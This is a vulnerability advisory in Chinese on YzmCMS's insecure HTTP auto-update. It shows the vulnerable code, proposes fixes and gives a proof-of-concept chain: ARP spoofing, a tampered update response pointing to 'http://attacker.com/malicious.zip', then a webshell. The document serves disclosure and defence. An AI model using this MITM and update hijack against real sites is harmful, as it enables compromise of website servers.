# YZMCMS-2025-001: HTTP明文自动更新机制导致远程代码执行

## 基本信息

| 字段 | 值 |
|------|-----|
| **项目** | [yzmcms/yzmcms](https://github.com/yzmcms/yzmcms) |
| **版本** | latest (截至 2026-05-27) |
| **严重性** | High |
| **CVSS 3.1** | 7.5 (AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:H) |
| **CWE** | CWE-319 (Cleartext Transmission of Sensitive Information) + CWE-494 (Download of Code Without Integrity Check) |
| **发现日期** | 2026-05-27 |
| **攻击向量** | 网络/MITM |

## 漏洞概述

YzmCMS 的自动更新系统存在三个连锁安全缺陷：

1. **HTTP 明文传输**: 更新检查、ZIP下载、应用商店三个API均使用 `http://api.yzmcms.com` (非HTTPS)
2. **无代码签名校验**: 下载的ZIP包直接解压覆盖网站根目录，无任何完整性校验
3. **远程JS执行**: 更新检查接口将服务端响应以 `Content-Type: application/javascript` 直接输出到管理面板

组合利用可达成：MITM攻击者 → 篡改更新响应 → 注入恶意ZIP下载链接 → 管理员点击更新 → RCE。

## 漏洞代码

### 1. HTTP明文更新URL (update.class.php)

```php
// 通知URL - 使用HTTP而非HTTPS
public static function notice_url($action="notice") {
    $pars = array(
        'action' => $action,
        'siteurl' => urlencode(SITE_URL),
        'sitename' => urlencode(get_config('site_name')),
        'version' => YZMCMS_VERSION,
        'software' => urlencode($_SERVER['SERVER_SOFTWARE']),
        'os' => PHP_OS,
        'php' => phpversion(),
        'mysql' => self::mysql_varsion(),
        'browser' => urlencode($_SERVER['HTTP_USER_AGENT']),
        'username' => urlencode($_SESSION['adminname']),
        'host' => gethostbyname($_SERVER['SERVER_NAME']),
        'server' => $_SERVER['SERVER_SOFTWARE']
    );
    $data = http_build_query($pars);
    return base64_decode('aHR0cDovL2FwaS55em1jbXMuY29tL25vdGljZS91cGRhdGUucGhwPw==') . $data;
    // 解码为: http://api.yzmcms.com/notice/update.php?
}
```

### 2. 远程JS注入 (check方法)

```php
public static function check() {
    $official_info = curl_exec($curl);
    curl_close($curl);
    // ...
    header('Content-Type: application/javascript');  // ⚠️ 服务端响应作为JS执行
    echo $official_info;  // ⚠️ 直接输出到管理面板
    exit;
}
```

### 3. ZIP下载+解压覆盖根目录 (system_update方法)

```php
public static function system_update() {
    // 从HTTP下载ZIP
    $result = downfile($service_data['downfile'], $service_data['file_md5']);
    // 解压到cache/down_package/
    $result = unzips($result['file_path'], $down_package);
    // 执行SQL升级脚本
    $res = exec_sql(file_get_contents($unzip_folder . '/sqls/upgrade.sql'));
    // 复制PHP文件覆盖网站根目录
    $copy_fail = copy_file($unzip_folder . '/files', YZMPHP_PATH);
}
```

### 4. 系统信息泄露 (store.class.php + update.class.php)

```php
// store::init() - 应用商店API也是HTTP
$api_url = base64_decode('aHR0cDovL2FwaS55em1jbXMuY29tL2FwaS9zdG9yZS9pbml0');
// 解码: http://api.yzmcms.com/api/store/init

// system_information() - 在每个管理面板页面执行
function system_information($data) {
    $notice_url = U("public_home", "up=1");
    $string = base64_decode('...');
    echo $data . str_replace('{notice_url}', $notice_url, $string);
}
```

## 攻击链 (Proof of Concept)

### 场景: 内网MITM攻击

```bash
# 步骤1: ARP欺骗，拦截管理员到 api.yzmcms.com 的HTTP流量

# 步骤2: 管理员访问后台首页 → system_information() 发送系统信息
# GET http://api.yzmcms.com/notice/update.php?action=notice&siteurl=...&username=admin&...
# ⚠️ 管理员的用户名、PHP版本、服务器IP等通过HTTP明文传输

# 步骤3: 管理员点击"检测更新" → check_update() → 返回HTTP响应
# MITM篡改响应:
{
  "status": 2,
  "message": "发现新版本！",
  "data": {
    "downfile": "http://attacker.com/malicious.zip",
    "file_md5": "any",
    "version": "999.0",
    ...
  }
}

# 步骤4: 管理员点击"一键更新" → system_update()
# → 从 http://attacker.com/malicious.zip 下载ZIP
# → 解压到 cache/down_package/
# → 执行 SQL 文件
# → 复制 PHP 文件到网站根目录
# → 攻击者获得Webshell
```

### 场景: DNS劫持/域名过期

```bash
# 如果 api.yzmcms.com 域名过期:
# 1. 攻击者注册该域名
# 2. 搭建伪造的更新服务器
# 3. 所有未更新的YzmCMS实例在下次检查更新时自动中招
```

## 影响范围

- 所有使用 YzmCMS 建站的实例（GitHub 290+ stars）
- 需要管理员触发更新（UI:R），但MITM攻击者可以在任何网络位置
- 更新URL硬编码为HTTP，无法通过配置修改

## 修复建议

### 方案1（推荐）：升级为HTTPS + 签名校验
```php
// 1. 所有API改为HTTPS
$api_base = 'https://api.yzmcms.com';

// 2. 下载文件时验证SHA256签名
$public_key = '...'; // 内置公钥
if (!openssl_verify($downloaded_zip, $signature, $public_key, 'sha256WithRSAEncryption')) {
    return_json(array('status' => 0, 'message' => '更新包签名校验失败！'));
}

// 3. check() 方法不应输出 JavaScript
public static function check() {
    header('Content-Type: application/json');
    echo json_encode($data);
}
```

### 方案2：移除自动更新，改为手动更新
```php
// 不在代码中硬编码更新URL
// 更新包通过官网手动下载，MD5校验后手动上传
```

## 额外发现：代码混淆隐藏行为

- `update.class.php` 和 `index.class.php` 使用 hex编码+goto控制流 混淆
- 作者注释："为了YzmCMS的长久发展(主要针对个别用户非法删除系统版权信息)，作者对本php文件加密"
- 混淆代码在管理面板注入版权信息和更新通知
- `system_information()` 函数将用户系统信息发送至 `api.yzmcms.com`

## 时间线

| 日期 | 事件 |
|------|------|
| 2026-05-27 | 通过白盒审计发现漏洞 |
| 待定 | 向 YzmCMS 团队报告 |
| 待定 | 修复发布 |

## 参考

- [CWE-319: Cleartext Transmission of Sensitive Information](https://cwe.mitre.org/data/definitions/319.html)
- [CWE-494: Download of Code Without Integrity Check](https://cwe.mitre.org/data/definitions/494.html)
- [OWASP: Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/)
